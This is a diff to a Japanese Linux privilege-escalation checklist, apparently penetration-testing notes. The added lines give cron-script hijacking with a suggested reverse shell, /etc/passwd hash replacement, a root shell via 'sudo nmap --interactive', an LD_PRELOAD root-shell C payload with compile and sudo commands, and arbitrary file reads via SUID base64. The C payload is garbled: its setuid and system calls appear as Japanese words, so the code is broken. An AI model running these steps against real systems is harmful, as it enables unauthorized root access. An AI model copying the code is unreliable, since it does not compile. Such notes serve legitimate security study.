@@ -63,12 +63,22 @@ reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
 ## 権限昇格
 1. /home/user配下に.bash_historyがないか、また、その中に認証情報等が平文で書かれていないか
 2. /home/usr/.bashrc内にセットされている環境変数に、認証情報がは無いか
-3. cronにスケジュールされいるファイルの中に、現在のユーザで書き込みができ、rootでcronの実行権限があるファイルはないか
+3. cronにスケジュールされいるファイルの中に、現在のユーザで書き込みができ、rootでcronの実行権限があるファイルはないか。  
 ```
 ls -lah /etc/cron*
 sudo crontab -l
+```  
+また、crontabはどのユーザでも確認することができる。/etc/crontabを確認し、rootによって実行される予定のあるタスクが無いかをチェックする。  
+ここで定義されている.shスクリプトがあり、かつそのファイルパスが指定されておらずPATHの環境変数内に書き込み権限があれば、同名のshファイルを書き込むことでroot実行される。  
+もしくは、.shファイルの最終行にリバースシェルのスクリプトを書き込むとか。
 ```
-3. /etc/passwdに書き込めれば、shadowよりも優先して認証に使われるため、任意のアカウントに任意のパスワードを設定できる。/etc/passwdに書き込み権限はないか
+cat /etc/crontab
+```
+
+3. /etc/passwdに書き込めれば、shadowよりも優先して認証に使われるため、任意のアカウントに任意のパスワードを設定できる。/etc/passwdに書き込み権限はないか。書き換えられる場合、以下でパスワードハッシュを生成してx部分を置き換えることでrootにhogeパスワードで入れるようになる。
+```
+openssl passwd hoge
+```
 
 4. kernel exploitは機能するか。以下のコマンドでOSとカーネルの情報を取得して脆弱性を検索できる。  
 ただしkernel exploitを実行するとマシンがぶっ壊れる可能性があるので最後の手段としておく。
@@ -86,9 +96,11 @@ ls -lah /etc/cron*
 find / -writable -type d 2>/dev/null
 ```
 7. SUIDがセットされているバイナリファイルを現在のユーザから実行できないか。  
-SUIDがセットされているファイルは以下で検索できる。
+SUIDがセットされているファイルは以下で検索できる。  
+SUIDがセットされていてroot権限で実行できるバイナリが見つかったら、[GTFObin](https://gtfobins.github.io/)でそのバイナリを使った権限昇格の手法が無いかを探す。
 ```
 find / -perm -u=s -type f 2>/dev/null
+find / -type f -perm -04000 -ls 2>/dev/null
 ```
 
 8. /etc/sudoersに書き込み権限がないか。
@@ -96,3 +108,46 @@ find / -perm -u=s -type f 2>/dev/null
 9. /opt配下にバックアップファイルなどが無いか。バックアップされた過去のファイルから認証情報を取得できる可能性がある。
 
 10. pspyを実行してみて、パイプを使った怪しいプロセスなどが無いか。また、プロセスの引数に認証情報があったり誰でも読み書きできる.shファイルをroot権限で実行していたりしないか。
+
+11. 念のため、historyコマンドで過去の認証情報を確認したか
+
+12. sudo権限でnmapを実行できないか。以下を使うとroot shellをとれる。
+```
+sudo nmap --interactive
+```
+
+13. sudo -lしたときに、env_keepオプションが有効で、かつ環境変数にLD_PRELOADが含まれていないか。LD_PRELOADは、プログr舞うの実行前にロードおよび実行される共有ライブラリを生成できる。  
+上記の条件を満たしている場合、.soファイル(共有オブジェクト)としてコンパイルされたCコードを作ってからsudoと.soファイルを指すLD_PRELOADオプションを使ってプログラムをコンパイルして実行する。以下のCコードでは、rootシェルを生成できる。  
+コンパイルは以下のコマンドを使う。  
+```
+gcc -fPIC -shared -o shell.so shell.c -nostartfiles
+```
+```.c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+unsetenv("LD_PRELOAD");
+setgid(0);
+セットID(0);
+システム("/bin/bash");
+}
+```
+最終的に、以下のようにしてコマンドを実行する。  
+```
+sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
+```
+
+14. SUIDセットなどによってbase64コマンドをroot権限で実行できないか。これができる場合、任意のファイルを読み取ることができる。
+```
+base64 /hoge.txt | base64 --decode
+```
+
+15. Capabilityのセットされたバイナリはないか。capabilityはSUIDチェックに引っかからないので注意。  
+以下のコマンドでシステム全体のCapabilityをチェックできる。
+```
+getcap -r / 2> /dev/null
+```
+
+16. echo $PATHで出力した環境変数のパス内に書き込み権限が存在しないか。書き込み権限がある場合、バイナリを置き換えてrootへの昇格ができる場合がある。
